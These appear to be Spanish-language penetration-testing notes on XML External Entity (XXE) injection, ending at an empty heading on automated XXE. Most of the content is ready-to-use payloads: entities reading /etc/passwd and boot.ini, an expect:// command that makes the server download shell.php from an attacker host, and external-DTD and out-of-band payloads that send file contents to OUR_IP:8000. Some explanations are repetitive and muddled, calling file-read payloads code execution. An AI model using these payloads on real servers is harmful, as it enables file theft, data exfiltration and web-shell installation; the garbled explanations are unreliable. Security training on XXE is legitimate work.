
# XXE (XML External Entity)
- XXE es una vulnerabilidad de seguridad que se produce cuando una aplicación web expone un punto de entrada que permite la inclusión de archivos XML externas.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría incluir archivos XML maliciosos en una solicitud POST o GET.

### Identificando XXE
- Para identificar XXE, se pueden seguir los siguientes pasos:
    - Identificar puntos de entrada que permiten la inclusión de archivos XML externas.
    - Verificar si la aplicación web permite la inclusión de archivos XML externas.
    - Verificar si la aplicación web permite la inclusión de archivos XML externas en las solicitudes POST o GET.

### Payloads con SYSTEM
- Para explotar XXE, se pueden utilizar diferentes payloads con SYSTEM.
- Un payload con SYSTEM es un payload que contiene una directiva de sistema que se ejecutará en el servidor.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar un payload con SYSTEM para ejecutar código en el servidor.
- Payloads:
    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>`
    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>`

### Payloads con DTD
- Para explotar XXE, se pueden utilizar diferentes payloads con DTD.
- Un payload con DTD es un payload que contiene una declaración de tipo de documento (DTD) que se utilizará para validar el documento XML.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar un payload con DTD para ejecutar código en el servidor.
- Payloads:
    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>`
    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>`

### Identificando XXE
- Primero tenemos que encontrar una petición que permita la inclusión de archivos XML externas.
- Puede ser desde un formulario, una solicitud HTTP, un archivo de configuración, un excel, etc.
- [Payloads list](https://github.com/payloadbox/xxe-injection-payload-list)

### RCE con XXE
- Podemos utilizar el siguiente payload para ejecutar comandos en el servidor:
    - `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://ls" >]><foo>&xxe;</foo>`
    - `<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">`
    - `<!ENTITY % file SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">%file;`

### Filtración con CDATA
- Para filtrar el contenido de una aplicación web, se puede utilizar la directiva CDATA.
- La directiva CDATA se utiliza para filtrar el contenido de una aplicación web.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar la directiva CDATA para filtrar el contenido de la aplicación web.
- Payloads:
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
#### Parametros en declaraciones de entidades
- Las declaraciones de entidades pueden contener parámetros que se utilizan para reemplazar valores dinámicos en la declaración de entidad.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar parámetros para reemplazar el contenido de la aplicación web.
- utilizamos `%` para poner parámetros en declaraciones de entidades.
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/SOME-FILE.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:PORT/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
- Desde la maquina atacante tenemos que xxe: `<!ENTITY joined "%begin;%file;%end;">`

### Error based XXE
- Error based XXE es un ataque que se basa en la identificación de errores en la aplicación web.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar un payload con DTD para ejecutar código en el servidor.
- Primero tenemos que ver de generar un error xml en la aplicación web.
- Luego podemos tener un DTD así:
```xml	
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Y podemos tener el siguiente payload en la petición
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
## Out of Band XXE (blind XXE)
- Es como una inyección ciega de SQLi, pero en este caso se utiliza un payload de tipo DTD para ejecutar código en el servidor.
- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar un payload de tipo DTD para ejecutar código en el servidor.
- Pero no vamos a ver ningún output en la aplicación web.
- Podemos tener el siguiente payload:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
y la petición:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

## XXE automatizado